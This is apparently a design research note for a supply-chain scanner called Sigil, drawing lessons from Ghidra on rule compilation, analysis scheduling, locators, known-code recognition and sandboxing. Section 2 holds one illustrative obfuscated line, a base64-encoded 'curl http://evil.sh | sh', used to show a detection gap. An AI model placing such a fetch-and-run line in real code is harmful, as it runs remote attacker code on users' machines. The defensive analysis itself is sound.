# What Sigil can adopt from Ghidra

**Status:** research note — input to future ADRs, not a decision
**Date:** 2026-08-30
**Subject:** [NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra) (Apache-2.0, NSA Research Directorate)

---

## Summary

Ghidra is a binary reverse-engineering framework and Sigil is a source/supply-chain
scanner, so most of Ghidra is not transferable. But Ghidra has spent a decade solving
four problems Sigil is hitting right now, and the shape of its answers transfers even
though the domain does not:

1. **How do you keep a large declarative rule corpus fast?** Ghidra compiles specs;
   Sigil currently re-parses and re-compiles its entire corpus once per file per phase.
2. **How do you analyse content that only exists after another analyser ran?**
   Ghidra schedules analysers on a worklist; Sigil runs eight phases exactly once over
   the original bytes, so decoded payloads are never scanned.
3. **How do you name a location inside a nested container?** Ghidra has FSRL; Sigil has
   a bare relative path string, and no finding fingerprints anywhere.
4. **How do you recognise known code instead of pattern-matching it?** Ghidra has
   Function ID and BSim; Sigil has no notion of "this is an unmodified published
   release", which is both its largest false-positive source and a blind spot for
   trojanised dependencies.

Ranked recommendations are in [§9](#9-ranked-recommendations). Nothing here requires
walking back [ADR-0005](../adr/ADR-0005-signed-declarative-signature-packs.md)'s
"the rules engine never executes user code" — Ghidra's most useful lessons are all
compatible with a purely declarative corpus, and one of them is the argument *for* it.

### What is explicitly not worth taking

Java and the JVM; the GUI and its plugin/docking framework; SLEIGH itself; the
decompiler; the Ghidra Server shared-project model; Gradle. Also **not** Ghidra's
extension model in its literal form — Ghidra discovers `ExtensionPoint` subclasses at
runtime via `ClassSearcher` and loads user-supplied JARs, which is exactly the arbitrary
code execution ADR-0005 rejects on self-consistency grounds. Sigil is right to reject it,
and should keep rejecting it. The lesson below (§2) is about *scheduling*, not about
loading foreign code.

One framing difference worth stating plainly, because it constrains everything else:
Ghidra is a human-in-the-loop tool that will happily spend minutes per function; Sigil is
a CI gate with a stated sub-60-second self-scan target
([ADR-0008](../adr/ADR-0008-scanner-walker-normalization-context.md)). Where Ghidra buys
capability with time, Sigil generally cannot. Ghidra's own answers to *its* performance
problems — compile the spec once, index the fingerprints — are the parts that transfer
best precisely because they were built under a similar constraint.

---

## 1. Compile the corpus once — the SLEIGH lesson

**Ghidra's mechanism.** Processor definitions are declarative text (`.slaspec`/`.sinc`).
They are never interpreted directly: they are compiled to a `.sla` runtime artifact,
cached, and recompiled only when the source file is newer than the compiled one. That
compile-once-cache-always step is what lets Ghidra support dozens of instruction sets
from data files without paying an interpretation cost per instruction decoded.

**Sigil today.** The corpus is declarative data, which is the right call — but it is
re-derived from scratch constantly. `phases.rs:19` defines:

```rust
fn all_packs() -> Vec<SignaturePack> {
    load_all_packs().unwrap_or_else(|e| { ... })
}
```

and every one of the eight phase functions calls it (`phases.rs:67`, `:78`, and so on).
Those phase functions are called per file, inside the rayon closure at
`scanner/mod.rs:296-321`. `load_all_packs()` (`corpus/loader.rs:112`) runs
`serde_json::from_str` over all twelve embedded packs on every call. `phase_packs`
(`phases.rs:26`) then `.clone()`s the matching packs. Finally,
`scan_file_with_packs` compiles each rule's regex inside the per-rule loop
(`corpus/engine.rs:94`):

```rust
let re = match Regex::new(&rule.pattern) {
    Ok(r) => r,
    Err(_) => continue,
};
let lines: Vec<&str> = contents.lines().collect();
```

— and re-collects `contents.lines()` once per rule, not once per file. There is no
memoisation anywhere: `OnceLock`, `OnceCell`, `lazy_static` and `once_cell` do not
appear in `cli/src/` at all.

For a 1,000-file repository against the ~210 embedded rules, that is roughly 8,000 full
corpus deserialisations and on the order of 200,000 regex compilations, for a workload
whose rule set never changes during the scan.

Measured on this repository:

```
Data Source:  Real measurement — `sigil scan . --no-cache -f json` against the
              Sigil repo, release build (cargo build --release) at commit 7e91369
Sample Size:  451 files scanned, single run
Result:       9,279 ms wall on 4 cores => ~20.6 ms/file wall, ~82 ms CPU/file
Limitations:  Single run, no repetition or variance measurement; one machine;
              no profiler attribution, so the split between corpus reloading,
              regex compilation and actual matching is inferred from the code
              path, not measured directly. Treat the total as solid and the
              attribution as a strong hypothesis.
```

82 ms of CPU per file — for mostly small text files against a fixed rule set — is far
above what line-matching should cost, and it scales linearly: a 10,000-file repository
would land near three and a half minutes, well past ADR-0008's `<60s` target. The repo
only stays under that today because `.sigilignore` and the default excludes keep the file
count at 451.

**What to adopt.** Ghidra's split between *spec* and *compiled spec*. Introduce a
`CompiledCorpus` built exactly once per process — parsed packs, pre-compiled `Regex`
values, phase-partitioned — behind a `OnceLock`, and hand `&CompiledCorpus` down into the
per-file closure. The rules stay declarative JSON; only the runtime representation
changes, so ADR-0005 is untouched.

The second half of the SLEIGH lesson is worth taking at the same time: compilation is
what makes a *growing* corpus affordable. Ghidra's declarative bet only pays off because
the compiled form is efficient. Sigil's corpus is 210 rules today and the roadmap wants
user rules, cloud rules and the 425-rule LOLBin bundle on top. Compiling the corpus into
a `regex::RegexSet` with an `aho-corasick` literal prefilter — one pass over each line
that cheaply rules out the ~99% of rules that cannot match — turns the per-line cost from
O(rules) into roughly O(1), and is the difference between a corpus that can grow and one
that cannot. Cache the compiled form keyed on a hash of the pack contents, mirroring
Ghidra's newer-source-triggers-recompile check.

**Cost:** small (a day or two, well-contained). **Payoff:** large and immediate.

---

## 2. Analyser scheduling, not a fixed pipeline — the worklist lesson

**Ghidra's mechanism.** An analyser declares a type — `BYTE_ANALYZER`,
`INSTRUCTION_ANALYZER`, `FUNCTION_ANALYZER`, `DATA_ANALYZER` — and a priority. The
analysis manager runs them against a worklist, and critically, **an analyser that
produces a new fact causes other analysers to run over that new fact.** Disassembling
bytes creates instructions, which wakes the instruction analysers; those find a function,
which wakes the function analysers. Analysis runs to a fixpoint rather than in a fixed
number of passes.

**Sigil today.** `scanner/mod.rs:292-330` is a fixed, hardcoded sequence: normalize, then
install-hooks, code-patterns, network-exfil, credentials, obfuscation, prompt-injection,
skill-security, inference-security, then cloud signatures. Each runs exactly once, over
the same immutable `contents` string.

The consequence is a real detection gap, not just an aesthetic one. **Sigil never scans
what it decodes.** A grep for `base64|decode` across `cli/src/scanner/` returns exactly
one hit, and it is `String::from_utf8_lossy` at `mod.rs:274`. So for a payload like:

```js
eval(Buffer.from("Y3VybCBodHRwOi8vZXZpbC5zaC B8IHNo", "base64").toString());
```

Sigil emits one `OBFUSC-*` finding for the shape of the expression, and the decoded
`curl http://evil.sh | sh` — which is what phases 1, 3 and 4 exist to catch — is never
looked at. The same holds for any nested archive member, any content extracted from a
decompressed layer, and any second-stage payload. `obfuscation_chain.json`'s 19 rules
partially compensate by encoding common *shapes* (`pickle.loads(base64.b64decode(...))`)
as single regexes, but that only works when the whole chain sits on one line, and it is
fundamentally a race against attacker variation that pattern-matching loses.

**No number of additional regexes fixes this.** It is an architecture property.

**What to adopt.** Ghidra's worklist model, in a deliberately small form. Rather than a
`Vec<PathBuf>` of files, scan a queue of *analysis units*, where a unit is
`(locator, content, depth)`. A phase may emit findings *and* enqueue derived units — a
decoded base64 blob, an extracted archive member, an unwrapped layer. Run to a fixpoint
with a hard depth cap (2–3 is plenty) and a total-work budget so a decompression bomb
cannot run away. Every existing phase then applies to derived content for free, and the
obfuscation phase changes character: instead of trying to recognise every possible
encoding *shape*, it decodes and lets the other seven phases judge the result.

The related, much smaller cleanup: phase identity is currently duplicated across eight
hardcoded `match` sites (`mod.rs:15`, `mod.rs:38`, `mod.rs:138`, `engine.rs:16`,
`engine.rs:40`, `scoring.rs:12`, `cloud_sigs.rs:91`, `output.rs:173`). Adding a phase
means editing all eight, and one of them is already wrong — `cloud_sigs::parse_phase`
(`cloud_sigs.rs:91-101`) has no arms for `prompt_injection`, `skill_security` or
`inference_security` and silently defaults them to `CodePatterns`, so a cloud signature
targeting the three newest phases lands with the wrong phase weight and is scored wrong.
A single static registry — one array of phase descriptors carrying name, weight and
handler — collapses those eight sites into one and makes that class of bug unexpressible.
This is Ghidra's `Analyzer` interface without Ghidra's runtime class discovery.

**Cost:** medium (the worklist is a real refactor of `run_scan`). **Payoff:** the largest
available detection improvement, and it closes a gap competitors also have.

---

## 3. FSRL — composable, hash-bearing locators

**Ghidra's mechanism.** A File System Resource Locator is a URL-shaped string that
composes recursively:

```
fstype://path[|fstype://path]*
```

optionally carrying an MD5 of the referenced content. It can address a file inside a ZIP
inside a firmware image without instantiating any of the intermediate filesystems, and
because the hash travels with the locator, a reference stays verifiable across sessions.

**Sigil today.** `Finding.file` is a plain `String` relative path (`scanner/mod.rs:73-90`).
`sigil npm`/`sigil pip` already extract tarballs before scanning (`main.rs:615-624`), so
findings inside a package are reported against a path in a temporary extraction directory,
with the container it came from lost. The roadmap adds Docker/OCI layers, which makes this
worse: a layer path alone does not identify anything.

Three separate downstream problems share this root cause:

- **`sigil diff` reports phantom findings.** `diff.rs:28` keys finding identity on
  `(rule, file, line)`. Insert a line at the top of a file and every finding below it is
  reported as new *and* resolved.
- **SARIF has no `partialFingerprints`.** `output.rs:390-447` emits `ruleId`, `level`,
  `message` and `physicalLocation` — no fingerprints. GitHub Code Scanning uses those to
  track an alert across commits; without them it re-raises alerts on any line drift, which
  is precisely the noise that gets a scanner switched off.
- **Findings inside containers are not addressable** for the ledger or for re-verification.

**What to adopt.** An FSRL-shaped locator as the finding's location type, carrying the
container chain and a content hash of the innermost artifact:

```
npm://left-pad-1.3.0.tgz|tar://package/dist/index.js
```

The hash is already computed elsewhere — `ledger.rs:136-144` hashes files to build the
approval pin — so this is mostly plumbing an existing value into a new place. It yields a
content-anchored fingerprint (rule id + artifact hash + a normalised snippet hash), which
fixes `sigil diff`, populates SARIF `partialFingerprints`, and gives the ledger and any
future known-good corpus (§4) the same addressing scheme.

**Cost:** small–medium. **Payoff:** fixes three known defects with one primitive.

---

## 4. Function ID and BSim — recognise known code instead of matching patterns

This is the strategically most valuable idea in Ghidra, and the one Sigil has no
equivalent of at all.

**Ghidra's mechanism, in two tiers.** *Function ID* stores precomputed hashes of
functions from known libraries with their metadata (name, library, version), so an
unnamed function in a stripped binary can be identified as, say, `memcpy` from a specific
glibc build. Ambiguity is resolved by looking at the call tree — two functions with
identical bodies that call different children are distinguished by their children's
hashes. *BSim* handles the fuzzy case: it generates a feature vector per function from the
decompiler's P-Code, deliberately excluding constants, register names and data types so
that functionally equivalent code produces equal features, then indexes the vectors with
locality-sensitive hashing and compares by cosine similarity. Exact-match identification
and "this is a modified copy of something I know" are treated as two different problems
with two different data structures.

**Sigil today.** No notion of known-good code exists. Every file is judged only by whether
its text matches a malicious pattern. Two consequences:

- **The false-positive rate is structural.** Clean packages are mostly *well-known* code —
  bundled runtimes, vendored libraries, minified dependencies, polyfill preambles — and
  Sigil re-litigates all of it from scratch on every scan.
- **Trojanised dependencies are invisible.** A copy of a popular library with three lines
  changed in one file is the `event-stream`/`ua-parser-js` attack shape. Sigil has no way
  to observe "this is release X with a modification", because it has nothing to compare
  against. The trust ledger ([ADR-0006](../adr/ADR-0006-quarantine-stateful-trust-ledger.md))
  detects drift *from what this user approved*, which is the right primitive but only
  covers artifacts the user has already approved once.

For context on the FP figure, from the project's own evaluation:

```
Data Source:  evaluation_results/honest_detection_eval.md — Datadog
              malicious-software-packages-dataset (human-triaged real malware)
              plus a clean control set
Sample Size:  351 malicious, 20 clean
Limitations:  Cold (ledger-empty) run, offline phases only. The clean control
              set is 20 packages — small. Recall 90.31% / FP 70.00% at the
              High threshold. The report's own caveats about imbalance
              distortion apply and are worth reading in full.
```

**What to adopt.** A known-good corpus, structured as Ghidra structures FID and BSim —
two tiers, because they answer different questions:

- **Exact tier.** Hash every file of published releases from npm and PyPI (the registries
  Sigil already fetches from) into a content-addressed index. An exact match answers "this
  is `lodash@4.17.21/lodash.js`, unmodified, as published". That is a suppression signal,
  and it should attack the clean-package FP rate directly, since it removes the largest
  category of noise — known code — rather than trying to describe it with more suppression
  predicates.
- **Fuzzy tier.** Minification, bundling and transpilation change bytes without changing
  meaning, which is exactly why Ghidra needed BSim on top of FID. The source-code analogue
  of BSim's "constants and register names deliberately excluded" is a per-function
  normalised hash: strip comments and whitespace, rename locals positionally, drop string
  literal contents. Index those with LSH so lookup stays sub-linear. Then "98% of this
  file's functions match `lodash@4.17.21`, two do not" becomes a **Critical** finding — a
  detection Sigil cannot currently make at any severity.

Sigil is unusually well positioned for this: it already downloads packages, already hashes
files (`ledger.rs`), already has a signed distribution channel for corpus data
(`loader.rs:52-91`), and the API already stores publisher reputation. The known-good
corpus is the same kind of compounding asset ADR-0005 identifies in the signature corpus,
pointed at the opposite polarity.

**Cost:** large — this is a programme, not a patch, and it needs corpus-building
infrastructure and storage. **Payoff:** the highest ceiling of anything in this document.
Worth scoping as its own ADR. Note that Ghidra distributes FID databases separately from
Ghidra itself (see the community `threatrack/ghidra-fidb-repo`), which is also the right
model here — see §7.

---

## 5. Parse hostile input out of process

**Ghidra's mechanism.** The decompiler — the component that chews on the most hostile,
most malformed input — is a native C++ executable that runs as a **separate process**,
communicating with the JVM over pipes. `DecompInterface` caches its initialisation state
so that when the decompiler process dies on a malformed or deliberately adversarial
binary, it restarts and recovers transparently. Ghidra's authors decided that the riskiest
parser should not share a failure domain with the tool.

**Sigil today.** Sigil's whole purpose is processing bytes chosen by an attacker, and its
riskiest surface is archive extraction: `main.rs:615-624` runs `zip`, `tar` and `flate2`
over downloaded package archives before scanning. Rust gives memory safety here, but
memory safety is not the whole threat model for an unpacker. Zip-slip path traversal,
symlink escape during extraction, decompression bombs and unbounded nesting depth are all
logic-level, and all reachable during what the user believes is a read-only scan.

There is also a live instance of the general class: `cloud_sigs.rs:149` slices
`&line[..200]` by byte index without walking to a character boundary. The identical bug was
found and fixed in `engine.rs:114-124` — with a regression test — but the fix was never
ported to the cloud-signature path. A cloud signature matching a line with a multi-byte
character straddling byte 200 panics and kills the scan.

**What to adopt.** Not Ghidra's IPC design — that is a Java problem. The transferable part
is the principle, and Sigil has already accepted the machinery for it:
[ADR-0009](../adr/ADR-0009-capability-minimal-scanning-sandbox-optin.md) commits to
OS-native sandbox primitives (Landlock and seccomp on Linux, Seatbelt on macOS) for the
opt-in `run` subcommand. Ghidra's lesson is that those primitives belong on the
**scanner's own extraction and parse path**, not only on the subcommand that admits it
executes something.

This directly reinforces Sigil's own stated design constraint. ADR-0009's principle is
that Sigil must never request broader permission than it warns against in other tools. A
scanner that can be induced to write outside its quarantine directory while "just
scanning" fails that test regardless of what permissions it requested. Concretely: extract
under a Landlock ruleset scoped to the quarantine path, refuse symlinks and absolute or
`..`-bearing entries, cap total extracted bytes and nesting depth, and treat a hit on any
of those caps as a finding rather than an error — a decompression bomb in a dependency is
itself a signal.

**Cost:** small–medium. **Payoff:** closes an unaudited attack surface on the tool itself,
and strengthens a claim Sigil already makes publicly.

---

## 6. Record the analysis configuration with the result

**Ghidra's mechanism.** Analysis options are persisted with the program, so a later
re-analysis is reproducible and a difference between two runs is attributable.

**Sigil today.** `cache.rs:82-85` already gets this exactly right, and the comment
explains why — serving a stale verdict after a detection upgrade is a security bug, so the
cache key includes `scanner_version` as well as `CACHE_VERSION`. But that discipline stops
at the cache. The JSON output consumed by `sigil diff --baseline` does not pin the corpus
version.

So when the corpus updates — which ADR-0005 explicitly wants to happen often, out of band
from binary releases — every `sigil diff` against an older baseline reports the new rules'
hits as new findings in the code. They are not: the code did not change, the rules did.
That is the failure mode that trains people to ignore a diff gate.

**What to adopt.** Put the engine version, the corpus pack versions and hashes, and the
effective options into the versioned JSON output ([ADR-0010](../adr/ADR-0010-output-contract-sarif-exit-codes.md)),
and have `diff.rs` read them: when the baseline's corpus differs from the current one,
partition the output into "new because the code changed" and "new because the rules
changed". The two are different facts and only the first should gate a build.

Adjacent, and worth fixing in the same pass: there are currently two conflicting exit-code
contracts in one binary. `exit_code_for` (`main.rs:894-900`) implements ADR-0010 —
0 below threshold, 1 at or above `--fail-on`, 2 on error — while the acquisition commands
(`clone`/`pip`/`npm`) use an undocumented verdict-based scheme at `main.rs:884-888` where 2
means High-or-Critical rather than "scan error". A CI job that treats 2 as an
infrastructure failure will silently pass malicious packages.

**Cost:** small. **Payoff:** removes a systematic source of false "new findings" and an
exit-code trap.

---

## 7. Ship the corpus as a dataset, not as part of the binary

**Ghidra's mechanism.** Function ID databases are distributed separately from Ghidra and
built by third parties; the community `threatrack/ghidra-fidb-repo` exists precisely
because the data has a different release cadence and a different set of contributors than
the tool. Ghidra ships the format and the loader; the data grows independently.

**Sigil today.** The mechanism already exists and works: user packs load from
`~/.sigil/packs/` with an Ed25519 verification policy (`loader.rs:52-91`, `:128-133`), and
failures containing `[SECURITY]` abort the scan rather than degrading silently
(`loader.rs:158-161`). But the core corpus is embedded at compile time via `include_str!`
(`loader.rs:15-35`), so in practice a rule change still ships as a binary release —
the thing ADR-0005 set out to eliminate when it said signature updates should become
data-plane.

The GPL-3.0 LOLBin bundle (425 rules) is already unbundled for licence reasons, and
`tools/corpus-gen/` already builds packs reproducibly with pinned upstream commit SHAs.
The pieces are in place.

**What to adopt.** Treat the core corpus as a signed, versioned, separately-released
dataset with the embedded packs as a bootstrap fallback for first run and air-gapped use.
Publish the pack schema (`corpus/schema.rs` is already a clean, documented format with
`FileFilter` and `SuppressionPredicates`) so third parties can contribute rules the way
they contribute FID databases to Ghidra. Ghidra's coverage of obscure architectures grew
because the format was public and the data was separable; the same dynamic is what would
let Sigil's corpus outrun a single team's authoring capacity.

**Cost:** small — mostly release engineering, since the loader, the signing and the
generator all exist. **Payoff:** delivers the outcome ADR-0005 already committed to.

---

## 8. One thing Ghidra validates that Sigil already does right

Worth recording, because it is a live argument in the project. ADR-0005 rejected plugin
scripts on the grounds that "an engine that executes arbitrary rule code fails Sigil's own
permission test", and named fuel-metered WASM with zero I/O imports as the only escalation
path it would consider.

Ghidra is a useful data point for the *other* half of that argument. Ghidra does allow
arbitrary Java and Python extensions, and that is appropriate for a tool a reverse engineer
runs deliberately on their own workstation with a human watching. But Ghidra also
demonstrates that the ambitious analysis — SLEIGH's processor semantics, FID's
identification, BSim's similarity search — is all built on **declarative data plus a fixed
engine**, not on user scripts. The scripting layer is for automation and one-offs; the
capability lives in the data.

That is the correct read for Sigil too. §1–§4 above are all substantial capability
increases and none of them require executing user-supplied code. The right response to
"declarative rules cannot express taint flows" is not a scripting engine — it is a richer
engine over richer normalised data, which is exactly what Ghidra chose.

---

## 9. Ranked recommendations

| # | Lesson | Ghidra mechanism | Sigil's gap | Cost | Payoff |
|---|---|---|---|---|---|
| 1 | Compile the corpus once, add a literal prefilter | SLEIGH `.slaspec` → cached `.sla` | `all_packs()` + `Regex::new` per rule per file per phase; zero memoisation | S | **High** — measured ~82 ms CPU/file (§1) |
| 2 | Worklist scheduling; re-scan derived content | `Analyzer` types + priority + fixpoint | 8 phases, once, over original bytes; decoded payloads never scanned | M | **Highest detection gain** |
| 3 | Composable hash-bearing locators | FSRL `a://x\|b://y` + content hash | `Finding.file` is a bare path; no fingerprints; SARIF lacks `partialFingerprints` | S–M | Fixes 3 known defects at once |
| 4 | Known-good corpus, exact + fuzzy tiers | Function ID + BSim (LSH, cosine) | No notion of "unmodified published release"; trojanised copies invisible | L | **Highest ceiling** — own ADR |
| 5 | Sandbox the scanner's own parse path | Decompiler as separate recoverable process | Archive extraction unsandboxed; `cloud_sigs.rs:149` byte-slice panic | S–M | Closes attack surface on the tool |
| 6 | Pin corpus version in results | Analysis options persisted with program | `diff` baseline unaware of corpus version; two exit-code contracts | S | Removes systematic diff noise |
| 7 | Corpus as a separately-released dataset | FID DBs distributed independently | Core packs `include_str!`-embedded; rule change needs a binary release | S | Delivers ADR-0005's stated goal |

**Suggested order.** (1) and (6) are contained fixes with immediate value — do them first.
(5) is small and closes a live bug. (3) unblocks (4) by giving it an addressing scheme, so
it should precede it. (2) is the highest-value change and the one most worth doing
carefully. (4) is a programme and should get its own ADR before any code.

---

## Sources

- [NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- [BSim tutorial — feature vectors, LSH indexing, cosine similarity](https://github.com/NationalSecurityAgency/ghidra/blob/master/GhidraDocs/GhidraClass/BSim/BSimTutorial_Intro.md)
- [BSIM explained once and for all — Quarkslab](https://blog.quarkslab.com/bsim-explained-once-and-for-all.html)
- [`Analyzer` interface (ExtensionPoint, analyzer types)](https://github.com/NationalSecurityAgency/ghidra/blob/master/Ghidra/Features/Base/src/main/java/ghidra/app/services/Analyzer.java)
- [`ClassSearcher` — extension point discovery](https://github.com/NationalSecurityAgency/ghidra/blob/master/Ghidra/Framework/Generic/src/main/java/ghidra/util/classfinder/ClassSearcher.java)
- [`FSRL` — File System Resource Locator](http://ghidra.re/ghidra_docs/api/ghidra/formats/gfilesystem/FSRL.html)
- [`FileSystemService` — nested archive handling](https://github.com/NationalSecurityAgency/ghidra/blob/master/Ghidra/Features/Base/src/main/java/ghidra/formats/gfilesystem/FileSystemService.java)
- [Function ID plug-in documentation](https://fossies.org/linux/ghidra/Ghidra/Features/FunctionID/src/main/help/help/topics/FunctionID/FunctionIDPlugin.html)
- [`threatrack/ghidra-fidb-repo` — community FID datasets](https://github.com/threatrack/ghidra-fidb-repo)
- [`DecompileProcess` — decompiler as a separate process](https://github.com/NationalSecurityAgency/ghidra/blob/master/Ghidra/Features/Decompiler/src/main/java/ghidra/app/decompiler/DecompileProcess.java)
- [Sleigh specification language overview](https://deepwiki.com/NationalSecurityAgency/ghidra/3.1-sleigh-specification-language)
